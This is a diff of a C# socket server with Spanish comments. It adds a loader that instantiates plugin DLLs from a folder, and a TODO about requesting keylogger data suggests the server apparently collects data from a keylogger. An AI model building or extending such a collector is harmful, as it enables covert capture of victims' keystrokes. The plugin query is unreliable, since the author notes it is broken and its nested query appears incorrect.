@@ -1,20 +1,22 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Net.Sockets;
 using System.Threading;
 using System.Net;
+using System.IO;
+using System.Linq;
+using System.Reflection;
 
 namespace Servidor_Sockets
 {
     //TODO: Pedir los datos del Keylogger
     //TODO: Implementar un metodo de control para hacer que la transmision pueda ser 
     //interrumpida por el cliente si asi lo desea, o si no necesita mas datos
-    //Como obtener la IP: (IPEndPoint)s.RemoteEndPoint).Address.ToString()
-    class ServidorFlu
+    public class ServidorFlu
     {
         private List<TcpClient> Clientes;
+        private List<IServerPlugin> Plugins;
         private TcpListener Servidor;
         //Avisa al plugin de control que hay un nuveo cliente
         public event EventHandler<ClienteConectado> ClienteConectado;
@@ -25,6 +27,7 @@ namespace Servidor_Sockets
             //Hint: http://msdn.microsoft.com/en-us/library/system.net.networkinformation.networkinterface.aspx
             Servidor = new TcpListener(21); Servidor.Start();
             Clientes = new List<TcpClient>();
+            Plugins = new List<IServerPlugin>(); CargarPlugins();
             (new Thread(new ThreadStart(AceptarConexiones))).Start();
         }
 
@@ -185,9 +188,23 @@ namespace Servidor_Sockets
             }
             catch { return Retorno; }
         }
+
+        public void CargarPlugins() 
+        {
+            //Los ultimos dos queries estan malos D:
+            if (!Directory.Exists("Plugins")) return;
+            Plugins.Clear();
+            DirectoryInfo ID = new DirectoryInfo(Path.Combine(Environment.CurrentDirectory, "Plugins"));
+            FileInfo[] Dlls = ID.GetFiles("*.dll");
+            var Ensamblados = from FileInfo Dll in Dlls select Assembly.LoadFile(Dll.FullName);
+            var Tipos = from Type T in (from Assembly As in Ensamblados select As.GetTypes()) select T;
+            var Implementaciones = from Type T in Tipos where T.GetInterfaces().Contains(typeof(IServerPlugin)) select Activator.CreateInstance(T) as IServerPlugin;
+            foreach (IServerPlugin SP in Implementaciones) Plugins.Add(SP);
+            foreach (IServerPlugin SP in Plugins) SP.InicializarPlugin(this);
+        }
     }
 
-    class ClienteConectado : EventArgs
+    public class ClienteConectado : EventArgs
     {
         public readonly IPAddress Direccion;
         public readonly int Puerto;
